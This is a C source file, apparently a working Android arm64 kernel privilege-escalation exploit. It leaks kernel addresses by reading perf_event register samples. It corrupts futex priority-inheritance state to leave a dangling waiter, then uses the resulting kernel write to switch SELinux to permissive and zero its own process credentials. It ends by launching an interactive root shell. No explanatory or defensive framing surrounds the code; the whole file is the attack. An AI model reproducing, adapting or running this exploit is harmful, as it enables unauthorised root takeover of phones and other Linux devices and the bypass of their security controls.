#define _GNU_SOURCE

#include <errno.h>
#include <fcntl.h>
#include <linux/futex.h>
#include <linux/capability.h>
#include <linux/perf_event.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/uio.h>
#include <ucontext.h>
#include <unistd.h>

#define LINK_TEXT UINT64_C(0xffffffc010080000)
#define OFF_INIT_TASK UINT64_C(0x22f9840)
#define OFF_SELINUX_STATE UINT64_C(0x247e000)
#define OFF_LOG_BUF UINT64_C(0x249bfac)
#define OFF_GET_TASK_PID UINT64_C(0x273750)
#define OFF_TASK_STATE UINT64_C(0x523f08)
#define OFF_FUTEX_WAIT_REQUEUE_PI UINT64_C(0x319218)
#define OFF_SEL_READ_ENFORCE UINT64_C(0x68ed24)
#define ARM64_REG_COUNT 33
#define ARM64_REG_MASK ((UINT64_C(1) << ARM64_REG_COUNT) - 1)

#define FUTEX_PRIVATE 128
#define LOCK_PI_PRIVATE (FUTEX_LOCK_PI | FUTEX_PRIVATE)
#define UNLOCK_PI_PRIVATE (FUTEX_UNLOCK_PI | FUTEX_PRIVATE)
#define WAIT_REQUEUE_PI_PRIVATE (FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE)
#define CMP_REQUEUE_PI_PRIVATE (FUTEX_CMP_REQUEUE_PI | FUTEX_PRIVATE)

static uint64_t runtime_text;
static uint64_t k_init_task;
static uint64_t k_selinux_state;
static uint64_t k_write_value;
static uint64_t k_fake_lock;
static uint64_t k_fake_lock2;
static uint64_t k_ghost_task;
static uint64_t k_current_task;
static uint64_t k_current_cred;
static uint64_t k_y_task;
static uint64_t k_waiter;
static int stage_fd = -1;
static pid_t process_pid;
static atomic_uintptr_t stamp_parent, stamp_value, stamp_lock;
static atomic_int stamp_done, stamp_status;

static int pi1, pi2, cond;
static atomic_int y_locked_l2, x_locked_l1, y_parking, x_blocking;
static atomic_int y_done, y_cleanup, x_done, y_tid;
static atomic_int y_task_ready;
static atomic_int respray_ready, respray_done;
static atomic_uintptr_t respray_parent, respray_value, respray_lock;
static unsigned fake_lock_index;
static int y_leak_only;

static long raw_futex(volatile int *u1, long op, long val, long val2,
                      volatile int *u2, long val3) {
  register long x0 __asm__("x0") = (long)u1;
  register long x1 __asm__("x1") = op;
  register long x2 __asm__("x2") = val;
  register long x3 __asm__("x3") = val2;
  register long x4 __asm__("x4") = (long)u2;
  register long x5 __asm__("x5") = val3;
  register long x8 __asm__("x8") = 98;
  __asm__ volatile("svc #0" : "+r"(x0) : "r"(x1), "r"(x2), "r"(x3),
                   "r"(x4), "r"(x5), "r"(x8) : "memory", "cc");
  return x0;
}

static long raw_sched_setscheduler(int tid, int policy,
                                   struct sched_param *param) {
  register long x0 __asm__("x0") = tid;
  register long x1 __asm__("x1") = policy;
  register long x2 __asm__("x2") = (long)param;
  register long x8 __asm__("x8") = 119;
  __asm__ volatile("svc #0" : "+r"(x0) : "r"(x1), "r"(x2), "r"(x8)
                   : "memory", "cc");
  return x0;
}

static uint64_t ring_u64(const uint8_t *ring, uint64_t size, uint64_t pos) {
  uint64_t v, off = pos & (size - 1);
  if (off + 8 <= size) memcpy(&v, ring + off, 8);
  else {
    uint8_t b[8]; uint64_t first = size - off;
    memcpy(b, ring + off, first); memcpy(b + first, ring, 8 - first);
    memcpy(&v, b, 8);
  }
  return v;
}

static uint64_t leak_text(void) {
  struct perf_event_attr a;
  memset(&a, 0, sizeof(a));
  a.type = PERF_TYPE_SOFTWARE;
  a.size = sizeof(a);
  a.config = PERF_COUNT_SW_CPU_CLOCK;
  a.sample_period = 100000;
  a.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_TID | PERF_SAMPLE_CALLCHAIN;
  a.sample_max_stack = 32;
  a.disabled = 1;
  a.exclude_hv = 1;
  int fd = syscall(__NR_perf_event_open, &a, 0, -1, -1, 0);
  if (fd < 0) return 0;
  long ps = sysconf(_SC_PAGESIZE);
  size_t map_size = (size_t)ps * 33;
  struct perf_event_mmap_page *m = mmap(NULL, map_size,
      PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (m == MAP_FAILED) { close(fd); return 0; }
  ioctl(fd, PERF_EVENT_IOC_RESET, 0);
  ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
  for (int i = 0; i < 2000000; i++) syscall(__NR_gettid);
  ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
  __sync_synchronize();
  uint64_t head = m->data_head, tail = m->data_tail, min = UINT64_MAX;
  uint8_t *ring = (uint8_t *)m + m->data_offset;
  uint64_t rs = m->data_size;
  while (tail + sizeof(struct perf_event_header) <= head) {
    struct perf_event_header h;
    uint64_t off = tail & (rs - 1);
    if (off + sizeof(h) <= rs) memcpy(&h, ring + off, sizeof(h));
    else {
      uint8_t b[sizeof(h)]; size_t first = rs - off;
      memcpy(b, ring + off, first); memcpy(b + first, ring, sizeof(h)-first);
      memcpy(&h, b, sizeof(h));
    }
    if (h.size < sizeof(h) || tail + h.size > head) break;
    if (h.type == PERF_RECORD_SAMPLE) {
      uint64_t pos = tail + sizeof(h);
      uint64_t ip = ring_u64(ring, rs, pos); pos += 16;
      uint64_t nr = ring_u64(ring, rs, pos); pos += 8;
      if (ip >= UINT64_C(0xffff000000000000) && ip < min) min = ip;
      for (uint64_t i = 0; i < nr && pos + 8 <= tail + h.size; i++) {
        uint64_t x = ring_u64(ring, rs, pos); pos += 8;
        if (x >= UINT64_C(0xffff000000000000) && x < min) min = x;
      }
    }
    tail += h.size;
  }
  munmap(m, map_size); close(fd);
  return min == UINT64_MAX ? 0 : (min & ~UINT64_C(0x1fffff)) + 0x80000;
}

static uint64_t leak_task_from_status(const char *status_path,
                                      uint64_t *cred_out) {
  struct perf_event_attr a;
  memset(&a, 0, sizeof(a));
  a.type = PERF_TYPE_SOFTWARE;
  a.size = sizeof(a);
  a.config = PERF_COUNT_SW_CPU_CLOCK;
  a.sample_period = 10000;
  a.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_TID | PERF_SAMPLE_CALLCHAIN |
                  PERF_SAMPLE_REGS_INTR;
  a.sample_regs_intr = ARM64_REG_MASK;
  a.sample_max_stack = 16;
  a.disabled = 1;
  a.exclude_user = 1;
  a.exclude_hv = 1;
  int fd = syscall(__NR_perf_event_open, &a, 0, -1, -1, 0);
  if (fd < 0) return 0;
  int status_fd = open(status_path, O_RDONLY | O_CLOEXEC);
  if (status_fd < 0) { close(fd); return 0; }
  long ps = sysconf(_SC_PAGESIZE);
  size_t map_size = (size_t)ps * 129;
  struct perf_event_mmap_page *m = mmap(NULL, map_size,
      PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (m == MAP_FAILED) { close(fd); return 0; }
  ioctl(fd, PERF_EVENT_IOC_RESET, 0);
  ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
  char status[4096];
  for (int i = 0; i < 100000; i++) {
    syscall(__NR_lseek, status_fd, 0, SEEK_SET);
    syscall(__NR_read, status_fd, status, sizeof(status));
  }
  ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
  __sync_synchronize();
  uint8_t *ring = (uint8_t *)m + m->data_offset;
  uint64_t size = m->data_size, tail = m->data_tail, head = m->data_head;
  uint64_t candidates[16] = {0};
  unsigned counts[16] = {0};
  while (tail + sizeof(struct perf_event_header) <= head) {
    struct perf_event_header h;
    uint64_t off = tail & (size - 1);
    if (off + sizeof(h) <= size) memcpy(&h, ring + off, sizeof(h));
    else {
      uint8_t b[sizeof(h)]; size_t first = size - off;
      memcpy(b, ring + off, first); memcpy(b + first, ring, sizeof(h)-first);
      memcpy(&h, b, sizeof(h));
    }
    if (h.size < sizeof(h) || tail + h.size > head) break;
    if (h.type == PERF_RECORD_SAMPLE) {
      uint64_t pos = tail + sizeof(h), ip = ring_u64(ring, size, pos);
      pos += 16;
      uint64_t nr = ring_u64(ring, size, pos); pos += 8 + nr * 8;
      uint64_t abi = ring_u64(ring, size, pos); pos += 8;
      uint64_t state = runtime_text + OFF_TASK_STATE;
      if (abi && ip >= state && ip < state + 0x370 &&
          pos + ARM64_REG_COUNT * 8 <= tail + h.size) {
        /* At entry task_state's task argument is x3.  From +0x2c onward it
         * is the callee-saved x26; get_task_cred has populated x20 at +0x90. */
        unsigned task_reg = ip <= state + 0x2c ? 3 : 26;
        uint64_t task = ring_u64(ring, size, pos + task_reg * 8);
        if (task >= UINT64_C(0xffffff8000000000) &&
            task < UINT64_C(0xffffffc000000000) && !(task & 7)) {
          unsigned slot;
          for (slot = 0; slot < 16 && candidates[slot] &&
               candidates[slot] != task; slot++);
          if (slot < 16) { candidates[slot] = task; counts[slot]++; }
        }
      }
      if (abi && ip >= state + 0x94 && ip < state + 0x370 &&
          pos + ARM64_REG_COUNT * 8 <= tail + h.size) {
        uint64_t cred = ring_u64(ring, size, pos + 20 * 8); /* x20 */
        if (cred >= UINT64_C(0xffffff8000000000) &&
            cred < UINT64_C(0xffffffc000000000) && !(cred & 7))
          *cred_out = cred;
      }
    }
    tail += h.size;
  }
  uint64_t best = 0; unsigned best_count = 0;
  for (unsigned i = 0; i < 16; i++)
    if (counts[i] > best_count) { best = candidates[i]; best_count = counts[i]; }
  munmap(m, map_size); close(status_fd); close(fd);
  return best_count && *cred_out ? best : 0;
}

static uint64_t leak_syscall_sp(void) {
  struct perf_event_attr a;
  memset(&a, 0, sizeof(a));
  a.type = PERF_TYPE_SOFTWARE;
  a.size = sizeof(a);
  a.config = PERF_COUNT_SW_CPU_CLOCK;
  a.sample_period = 1000;
  a.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_TID | PERF_SAMPLE_CALLCHAIN |
                  PERF_SAMPLE_REGS_INTR;
  a.sample_regs_intr = ARM64_REG_MASK;
  a.sample_max_stack = 16;
  a.disabled = 1;
  a.exclude_user = 1;
  a.exclude_hv = 1;
  int fd = syscall(__NR_perf_event_open, &a, 0, -1, -1, 0);
  if (fd < 0) return 0;
  long ps = sysconf(_SC_PAGESIZE);
  size_t map_size = (size_t)ps * 129;
  struct perf_event_mmap_page *m = mmap(NULL, map_size,
      PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (m == MAP_FAILED) { close(fd); return 0; }
  volatile int a1 = 1, a2 = 0;
  ioctl(fd, PERF_EVENT_IOC_RESET, 0);
  ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
  for (int i = 0; i < 150000; i++)
    (void)raw_futex(&a1, WAIT_REQUEUE_PI_PRIVATE, 0, 0, &a2, 0);
  ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
  __sync_synchronize();
  uint8_t *ring = (uint8_t *)m + m->data_offset;
  uint64_t size = m->data_size, tail = m->data_tail, head = m->data_head;
  uint64_t candidates[16] = {0};
  unsigned counts[16] = {0};
  uint64_t fun = runtime_text + OFF_FUTEX_WAIT_REQUEUE_PI;
  while (tail + sizeof(struct perf_event_header) <= head) {
    struct perf_event_header h;
    uint64_t off = tail & (size - 1);
    if (off + sizeof(h) <= size) memcpy(&h, ring + off, sizeof(h));
    else {
      uint8_t b[sizeof(h)]; size_t first = size - off;
      memcpy(b, ring + off, first); memcpy(b + first, ring, sizeof(h)-first);
      memcpy(&h, b, sizeof(h));
    }
    if (h.size < sizeof(h) || tail + h.size > head) break;
    if (h.type == PERF_RECORD_SAMPLE) {
      uint64_t pos = tail + sizeof(h), ip = ring_u64(ring, size, pos);
      pos += 16;
      uint64_t nr = ring_u64(ring, size, pos); pos += 8 + nr * 8;
      uint64_t abi = ring_u64(ring, size, pos); pos += 8;
      if (abi && ip >= fun + 0x80 && ip < fun + 0x380 &&
          pos + ARM64_REG_COUNT * 8 <= tail + h.size) {
        uint64_t sp = ring_u64(ring, size, pos + 31 * 8);
        uint64_t syscall_sp = sp + 0x230;
        unsigned slot;
        for (slot = 0; slot < 16 && candidates[slot] &&
             candidates[slot] != syscall_sp; slot++);
        if (slot < 16) { candidates[slot] = syscall_sp; counts[slot]++; }
      }
    }
    tail += h.size;
  }
  uint64_t best = 0; unsigned best_count = 0;
  for (unsigned i = 0; i < 16; i++)
    if (counts[i] > best_count) { best = candidates[i]; best_count = counts[i]; }
  munmap(m, map_size); close(fd);
  return best_count ? best : 0;
}

static uint64_t leak_selinux_state(void) {
  struct perf_event_attr a;
  memset(&a, 0, sizeof(a));
  a.type = PERF_TYPE_SOFTWARE;
  a.size = sizeof(a);
  a.config = PERF_COUNT_SW_CPU_CLOCK;
  a.sample_period = 1000;
  a.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_TID | PERF_SAMPLE_CALLCHAIN |
                  PERF_SAMPLE_REGS_INTR;
  a.sample_regs_intr = ARM64_REG_MASK;
  a.sample_max_stack = 16;
  a.disabled = 1;
  a.exclude_user = 1;
  a.exclude_hv = 1;
  int fd = syscall(__NR_perf_event_open, &a, 0, -1, -1, 0);
  if (fd < 0) return 0;
  int enforce_fd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
  if (enforce_fd < 0) { close(fd); return 0; }
  long ps = sysconf(_SC_PAGESIZE);
  size_t map_size = (size_t)ps * 129;
  struct perf_event_mmap_page *m = mmap(NULL, map_size,
      PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (m == MAP_FAILED) { close(enforce_fd); close(fd); return 0; }
  ioctl(fd, PERF_EVENT_IOC_RESET, 0);
  ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
  char b[8];
  for (int i = 0; i < 150000; i++) {
    (void)syscall(__NR_lseek, enforce_fd, 0, SEEK_SET);
    (void)syscall(__NR_read, enforce_fd, b, sizeof(b));
  }
  ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
  __sync_synchronize();
  uint8_t *ring = (uint8_t *)m + m->data_offset;
  uint64_t size = m->data_size, tail = m->data_tail, head = m->data_head;
  uint64_t candidates[16] = {0};
  unsigned counts[16] = {0};
  uint64_t fun = runtime_text + OFF_SEL_READ_ENFORCE;
  while (tail + sizeof(struct perf_event_header) <= head) {
    struct perf_event_header h;
    uint64_t off = tail & (size - 1);
    if (off + sizeof(h) <= size) memcpy(&h, ring + off, sizeof(h));
    else {
      uint8_t tmp[sizeof(h)]; size_t first = size - off;
      memcpy(tmp, ring + off, first);
      memcpy(tmp + first, ring, sizeof(h) - first);
      memcpy(&h, tmp, sizeof(h));
    }
    if (h.size < sizeof(h) || tail + h.size > head) break;
    if (h.type == PERF_RECORD_SAMPLE) {
      uint64_t pos = tail + sizeof(h), ip = ring_u64(ring, size, pos);
      pos += 16;
      uint64_t nr = ring_u64(ring, size, pos); pos += 8 + nr * 8;
      uint64_t abi = ring_u64(ring, size, pos); pos += 8;
      if (abi && ip >= fun + 0x58 && ip <= fun + 0x60 &&
          pos + ARM64_REG_COUNT * 8 <= tail + h.size) {
        uint64_t state = ring_u64(ring, size, pos + 8 * 8);
        if (state >= UINT64_C(0xffffffc000000000) && !(state & 0xfff)) {
          unsigned slot;
          for (slot = 0; slot < 16 && candidates[slot] &&
               candidates[slot] != state; slot++);
          if (slot < 16) { candidates[slot] = state; counts[slot]++; }
        }
      }
    }
    tail += h.size;
  }
  uint64_t best = 0; unsigned best_count = 0;
  for (unsigned i = 0; i < 16; i++)
    if (counts[i] > best_count) { best = candidates[i]; best_count = counts[i]; }
  munmap(m, map_size); close(enforce_fd); close(fd);
  return best_count ? best : 0;
}

static void cpu_yield(void) {
  __asm__ volatile("yield" ::: "memory");
}

static void record_stage(char stage) {
  if (stage_fd < 0) return;
  ssize_t written = pwrite(stage_fd, &stage, 1, 0);
  if (written != 1) return;
  (void)fsync(stage_fd);
}

struct k_fpsimd_context {
  uint32_t magic, size, fpsr, fpcr;
  uint8_t vregs[32 * 16];
};

static struct k_fpsimd_context *find_fpsimd(unsigned char *p,
                                            unsigned char *end) {
  while ((size_t)(end - p) >= 8) {
    uint32_t magic, size;
    memcpy(&magic, p, 4); memcpy(&size, p + 4, 4);
    if (!magic && !size) return NULL;
    if (size < 8 || (size & 15) || (size_t)(end - p) < size) return NULL;
    if (magic == UINT32_C(0x46508001) && size >= 0x210)
      return (struct k_fpsimd_context *)(void *)p;
    p += size;
  }
  return NULL;
}

static void sigusr2(int sig, siginfo_t *info, void *opaque) {
  (void)sig; (void)info;
  ucontext_t *uc = opaque;
  unsigned char *start = uc->uc_mcontext.__reserved;
  struct k_fpsimd_context *fp = find_fpsimd(start, start +
                                             sizeof(uc->uc_mcontext.__reserved));
  if (!fp || (size_t)0x148 + 0x50 > sizeof(fp->vregs)) {
    atomic_store(&stamp_status, -1); atomic_store(&stamp_done, 1); return;
  }
  /* Measured on S0029: restore_fpsimd_context is entered at syscall SP-0x90
   * (parse_user_sigframe has already returned), then reserves 0x250 bytes.
   * The copy starts at SP-0x2e0; rt_mutex_waiter is at SP-0x198. */
  uint64_t *w = (uint64_t *)(void *)(fp->vregs + 0x148);
  memset(w, 0, 0x50);
  w[0] = atomic_load(&stamp_parent); /* main tree parent_color */
  w[1] = atomic_load(&stamp_value);  /* main tree right */
  w[2] = 0;                         /* main tree left */
  w[6] = k_ghost_task;              /* zero-BSS dead-end task +0x30 */
  w[7] = atomic_load(&stamp_lock);   /* lock +0x38 */
  atomic_store(&stamp_status, 1);
  atomic_store(&stamp_done, 1);
}

static int stamp_waiter(uint64_t parent, uint64_t value, uint64_t lock) {
  atomic_store(&stamp_parent, parent);
  atomic_store(&stamp_value, value);
  atomic_store(&stamp_lock, lock);
  atomic_store(&stamp_status, 0);
  atomic_store(&stamp_done, 0);
  (void)syscall(SYS_tgkill, process_pid, atomic_load(&y_tid), SIGUSR2);
  return atomic_load_explicit(&stamp_done, memory_order_acquire) &&
         atomic_load(&stamp_status) == 1;
}

static void sigusr1(int sig) { (void)sig; }

static void *thread_y(void *unused) {
  (void)unused;
  struct sigaction sa;
  memset(&sa, 0, sizeof(sa));
  sa.sa_sigaction = sigusr2;
  sa.sa_flags = SA_SIGINFO | SA_RESTART;
  sigemptyset(&sa.sa_mask);
  if (sigaction(SIGUSR2, &sa, NULL) != 0) return NULL;
  int tid = (int)syscall(__NR_gettid);
  atomic_store(&y_tid, tid);
  char status_path[64];
  uint64_t y_cred = 0;
  snprintf(status_path, sizeof(status_path), "/proc/self/task/%d/status", tid);
  k_y_task = leak_task_from_status(status_path, &y_cred);
  uint64_t syscall_sp = leak_syscall_sp();
  k_waiter = syscall_sp ? syscall_sp - 0x198 : 0;
  atomic_store_explicit(&y_task_ready, k_y_task && k_waiter ? 1 : -1,
                        memory_order_release);
  if (!k_y_task || !k_waiter) return NULL;
  if (y_leak_only) return NULL;
  if (raw_futex(&pi2, LOCK_PI_PRIVATE, 0, 0, NULL, 0) != 0) return NULL;
  atomic_store(&y_locked_l2, 1);
  while (!atomic_load(&x_locked_l1)) sched_yield();
  atomic_store(&y_parking, 1);
  (void)raw_futex(&cond, WAIT_REQUEUE_PI_PRIVATE, 0, 0, &pi1, 0);

  int stamped = stamp_waiter(0, 0, k_fake_lock);
  atomic_store_explicit(&y_done, stamped ? 1 : -1, memory_order_release);
  for (;;) {
    if (atomic_exchange(&respray_ready, 0)) {
      stamped = stamp_waiter(atomic_load(&respray_parent),
                             atomic_load(&respray_value),
                             atomic_load(&respray_lock));
      atomic_store_explicit(&respray_done, stamped ? 1 : -1,
                            memory_order_release);
    }
    if (atomic_load_explicit(&y_cleanup, memory_order_acquire)) break;
    cpu_yield();
  }
  int dummy = (int)(0x80000000U | (unsigned)getpid());
  struct timespec zero = {0, 0};
  (void)raw_futex(&dummy, LOCK_PI_PRIVATE, 0, (long)&zero, NULL, 0);
  (void)raw_futex(&pi2, UNLOCK_PI_PRIVATE, 0, 0, NULL, 0);
  while (!atomic_load(&x_done)) sched_yield();
  return NULL;
}

static void *thread_x(void *unused) {
  (void)unused;
  while (!atomic_load(&y_locked_l2)) sched_yield();
  if (raw_futex(&pi1, LOCK_PI_PRIVATE, 0, 0, NULL, 0) != 0) return NULL;
  atomic_store(&x_locked_l1, 1);
  atomic_store(&x_blocking, 1);
  (void)raw_futex(&pi2, LOCK_PI_PRIVATE, 0, 0, NULL, 0);
  (void)raw_futex(&pi1, UNLOCK_PI_PRIVATE, 0, 0, NULL, 0);
  (void)raw_futex(&pi2, UNLOCK_PI_PRIVATE, 0, 0, NULL, 0);
  atomic_store(&x_done, 1);
  return NULL;
}

static long trigger_pi(void) {
  static int policy;
  struct sched_param p = {.sched_priority = 0};
  policy = policy == SCHED_OTHER ? SCHED_BATCH : SCHED_OTHER;
  return raw_sched_setscheduler(atomic_load(&y_tid), policy, &p);
}

static int read_enforce(void) {
  char b[4] = {0}; int fd = open("/sys/fs/selinux/enforce", O_RDONLY);
  if (fd < 0) return -1;
  ssize_t n = read(fd, b, sizeof(b)); close(fd);
  return n > 0 ? b[0] - '0' : -1;
}

static int write_value(uint64_t target, uint64_t value) {
  static const unsigned windows[] = {0xa80, 0xb00, 0xb80, 0xc00, 0xc80};
  k_fake_lock2 = k_selinux_state + windows[fake_lock_index++ % 5];
  atomic_store(&respray_parent, (target - 8) & ~UINT64_C(3));
  atomic_store(&respray_value, value);
  atomic_store(&respray_lock, k_fake_lock2);
  atomic_store(&respray_done, 0);
  atomic_store_explicit(&respray_ready, 1, memory_order_release);
  while (!atomic_load_explicit(&respray_done, memory_order_acquire)) sched_yield();
  if (atomic_load(&respray_done) < 0) return 0;
  return trigger_pi() == 0;
}

static void ignore_terminal_signals(void) {
  struct sigaction ignore;
  memset(&ignore, 0, sizeof(ignore));
  ignore.sa_handler = SIG_IGN;
  sigemptyset(&ignore.sa_mask);
  (void)sigaction(SIGHUP, &ignore, NULL);
  (void)sigaction(SIGINT, &ignore, NULL);
  (void)sigaction(SIGQUIT, &ignore, NULL);
}

int main(int argc, char **argv) {
  setvbuf(stdout, NULL, _IONBF, 0);
  stage_fd = open("/data/local/tmp/ghostlock54.stage",
                  O_WRONLY | O_CREAT | O_CLOEXEC, 0600);
  record_stage('0');
  process_pid = getpid();
  struct sigaction sa;
  memset(&sa, 0, sizeof(sa));
  sa.sa_handler = sigusr1;
  sigemptyset(&sa.sa_mask);
  if (sigaction(SIGUSR1, &sa, NULL) != 0) return 1;
  runtime_text = leak_text();
  if (!runtime_text) { fprintf(stderr, "[-] KASLR leak failed\n"); return 1; }
  k_selinux_state = leak_selinux_state();
  if (!k_selinux_state) {
    fprintf(stderr, "[-] SELinux state leak failed\n");
    return 1;
  }
  k_current_task = leak_task_from_status("/proc/self/status", &k_current_cred);
  if (!k_current_task) {
    fprintf(stderr, "[-] current task leak failed\n");
    return 1;
  }
  record_stage('1');
  uint64_t slide = runtime_text - LINK_TEXT;
  uint64_t data_delta = k_selinux_state -
                        (runtime_text + OFF_SELINUX_STATE);
  k_init_task = runtime_text + OFF_INIT_TASK + data_delta;
  /* Runtime address inside __log_buf, rounded up to 64 KiB.  Its numeric
   * low 16 bits are zero, so the 8-byte tree write makes disabled=0 and
   * enforcing=0 while initialized remains nonzero. */
  uint64_t log_start = runtime_text + OFF_LOG_BUF + data_delta;
  k_write_value = (log_start + 0xffff) & ~UINT64_C(0xffff);
  /* selinux_state+0x20..+0xfff is verified symbol-free zero BSS.  The fake
   * task's last PI field is +0x900; independent fake locks begin at +0xa00. */
  k_ghost_task = k_selinux_state + 0x20;
  k_fake_lock = k_selinux_state + 0xa00;
  printf("[*] _text=%016llx slide=%016llx data_delta=%llx init_task=%016llx\n",
         (unsigned long long)runtime_text, (unsigned long long)slide,
         (unsigned long long)data_delta,
         (unsigned long long)k_init_task);
  printf("[*] current_task=%016llx current_cred=%016llx\n",
         (unsigned long long)k_current_task,
         (unsigned long long)k_current_cred);
  printf("[*] selinux_state=%016llx fake_lock=%016llx ghost=%016llx value=%016llx\n",
         (unsigned long long)k_selinux_state,
         (unsigned long long)k_fake_lock,
         (unsigned long long)k_ghost_task,
         (unsigned long long)k_write_value);
  if (argc == 2 && strcmp(argv[1], "--leak-only") == 0) {
    printf("[+] leak-only verified\n");
    return 0;
  }

  pthread_t tx, ty;
  y_leak_only = argc == 2 && strcmp(argv[1], "--leak-y-only") == 0;
  if (pthread_create(&ty, NULL, thread_y, NULL) != 0) return 2;
  while (!atomic_load_explicit(&y_task_ready, memory_order_acquire)) sched_yield();
  if (atomic_load(&y_task_ready) < 0) {
    fprintf(stderr, "[-] Y task leak failed\n");
    return 2;
  }
  printf("[*] y_task=%016llx waiter=%016llx\n",
         (unsigned long long)k_y_task, (unsigned long long)k_waiter);
  if (y_leak_only) {
    pthread_join(ty, NULL);
    printf("[+] Y task leak-only verified\n");
    return 0;
  }
  while (!atomic_load(&y_locked_l2)) sched_yield();
  if (pthread_create(&tx, NULL, thread_x, NULL) != 0) return 2;
  while (!(atomic_load(&x_locked_l1) && atomic_load(&y_parking) &&
           atomic_load(&x_blocking))) sched_yield();
  usleep(200000);
  record_stage('2');
  long r = raw_futex(&cond, CMP_REQUEUE_PI_PRIVATE, 1, 0, &pi1, 0);
  record_stage('3');
  cond = 1;
  __atomic_thread_fence(__ATOMIC_SEQ_CST);
  syscall(SYS_tgkill, getpid(), atomic_load(&y_tid), SIGUSR1);
  if (r != -EDEADLK) {
    fprintf(stderr, "[-] cycle result=%ld expected=%d\n", r, -EDEADLK);
    return 3;
  }
  while (!atomic_load_explicit(&y_done, memory_order_acquire)) sched_yield();
  if (atomic_load(&y_done) < 0) {
    record_stage('E');
    fprintf(stderr, "[-] sigreturn stamp failed\n");
    return 4;
  }
  record_stage('4');
  printf("[+] dangling waiter armed\n");
  if (trigger_pi() != 0) { fprintf(stderr, "[-] settle trigger failed\n"); return 4; }
  usleep(100000);
  record_stage('5');
  printf("[+] waiter settled\n");

  int before = read_enforce();
  int wr = write_value(k_selinux_state, k_write_value);
  usleep(100000);
  record_stage('6');
  int after = read_enforce();
  printf("[*] write_trigger=%d enforce=%d->%d\n", wr, before, after);
  if (after != 0) {
    fprintf(stderr, "[-] SELinux write not observed\n");
    return 5;
  }
  printf("[+] SELinux permissive verified\n");

  static const unsigned id_offsets[] = {0x4, 0xc, 0x14, 0x1c};
  for (unsigned i = 0; i < sizeof(id_offsets) / sizeof(id_offsets[0]); i++) {
    if (!write_value(k_current_cred + id_offsets[i], 0)) {
      fprintf(stderr, "[-] cred id write trigger failed\n");
      return 6;
    }
    record_stage((char)('7' + i));
  }
  usleep(100000);
  printf("[*] uid=%u euid=%u gid=%u egid=%u enforce=%d\n",
         getuid(), geteuid(), getgid(), getegid(), read_enforce());
  if (getuid() != 0 || geteuid() != 0 || read_enforce() != 0) {
    fprintf(stderr, "[-] root/permissive verification failed\n");
    return 7;
  }
  record_stage('9');
  ignore_terminal_signals();
  printf("[+] ROOT + permissive verified; entering direct shell\n");
  pid_t shell = fork();
  if (shell < 0) {
    fprintf(stderr, "[-] shell fork failed: %s\n", strerror(errno));
    for (;;) pause();
  }
  if (shell == 0) {
    struct sigaction defaults;
    memset(&defaults, 0, sizeof(defaults));
    defaults.sa_handler = SIG_DFL;
    sigemptyset(&defaults.sa_mask);
    (void)sigaction(SIGHUP, &defaults, NULL);
    (void)sigaction(SIGINT, &defaults, NULL);
    (void)sigaction(SIGQUIT, &defaults, NULL);
    execl("/system/bin/sh", "sh", "-i", (char *)NULL);
    _exit(30);
  }
  close(STDIN_FILENO);
  close(STDOUT_FILENO);
  close(STDERR_FILENO);
  for (;;) pause();
}
